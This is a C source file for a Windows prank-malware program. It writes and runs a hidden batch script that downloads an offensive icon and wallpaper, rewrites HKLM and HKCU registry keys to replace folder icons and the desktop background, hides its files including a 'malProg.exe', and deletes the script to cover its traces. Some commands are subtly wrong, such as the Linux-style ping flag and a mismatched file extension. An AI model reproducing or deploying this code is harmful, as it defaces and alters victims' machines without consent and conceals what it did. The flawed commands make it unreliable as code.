#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int onlineVersion(){
	FILE * fp;

    //Create and open batch file to insert registry commands
    fp = fopen("mal.bat", "w+");

    //Test for file
    if (fp == NULL) {
        printf("womp\n");
        printf("%s",strerror(errno));
        exit(EXIT_FAILURE);
    } else {
        
        //Command to enable multiple line input
        fprintf(fp, "setlocal enabledelayedexpansion \n");
        
        //Create command line variables for links
        fprintf(fp, "set iconLink=http://www.iconarchive.com/download/i108459/google/noto-emoji-people-bodyparts/11947-middle-finger-light-skin-tone.ico \n");
        fprintf(fp, "set imageLink=http://icons.iconarchive.com/icons/google/noto-emoji-people-bodyparts/1024/11947-middle-finger-light-skin-tone-icon.png \n");
        
        //Start powershell to retrieve images from the internet
        fprintf(fp, "start powershell curl \"%%iconLink%% -o malIcon.ico\" \n");
        fprintf(fp, "start powershell curl \"%%imageLink%% -o malImage.png\" \n");
        
        //Create command line variables for the path to retrieved images
        fprintf(fp, "set \"targ1=%%cd%%\\malIcon.ico\" \n");
        fprintf(fp, "set \"targ2=%%cd%%\\malImage.png\" \n");
        
        //Registry commands -- Create new key for Shell Icons
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v /f \n");
        
        //Registry commands -- Set default folder value to image path
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v \"3\" /t REG_EXPAND_SZ /d %%targ1%% /f \n");
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v \"4\" /t REG_EXPAND_SZ /d %%targ1%% /f \n");
        
        //Registry commands -- change wallpaper values to image path
        fprintf(fp, "REG ADD \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n");
        fprintf(fp, "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n");
        
        //command to load updated registry values into the system
        fprintf(fp, "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
    }

    //close file
    fclose(fp);

	//start the created scipt
    system("start mal.bat");
    
    //Hide the images and malicious program
    system("attrib +h malIcon.ico");
    system("attrib +h malImage.ico");
    system("attrib +h malProg.exe");
    
    //Delete the batch script
    system("del mal.bat");
    
    return 0;
}

int offlineVersion(){
    FILE * fp;

    //Create and open bat file to insert regsitry commands
    fp = fopen("mal.bat", "w+");
    
    //Test for file
    if (fp == NULL) {
    	printf("womp\n");
    	printf("%s", strerror(errno));
    	exit(EXIT_FAILURE);    
    } else {
    	
    	//Registry commands -- change wallpaper
    	fprintf(fp, "REG ADD \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"255 247 8\" /f \n");
        fprintf(fp, "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\" /v Wallpaper /t REG_SZ /d \"255 247 8\" /f \n");
        
        //Registry commands -- Create new key for Shell Icons
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v /f \n");
        
        //Registry commands -- changes default icons for folders
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v \"3\" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n");
        fprintf(fp, "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\" /v \"4\" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n");
        
        //Command to load updated registry values into the system
        fprintf(fp, "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
    	
    	//close file
    	fclose(fp);

    	//start the file just created
    	system("start mal.bat");
    	Sleep(1000); 
    	//delete the file to limit presence
    	system("del mal.bat");

    	return 0;
    }
}

int main() {
    //Variables to get windows version
    DWORD dwVersion = 0;
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0;

    //function to get windows version
    dwVersion = GetVersion();
	
	//More specific windows version using conversion
    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

    //Test for windows 8 or above
    if ((dwMajorVersion >= 6) & (dwMinorVersion >= 2)){
        
        //Test for internet connection using ping
        if (system("ping 45.33.40.23 -c 1")) {
            offlineVersion();
        } else {
            onlineVersion();
        }
    } else {
        offlineVersion();
    }
    
    return 0;
}
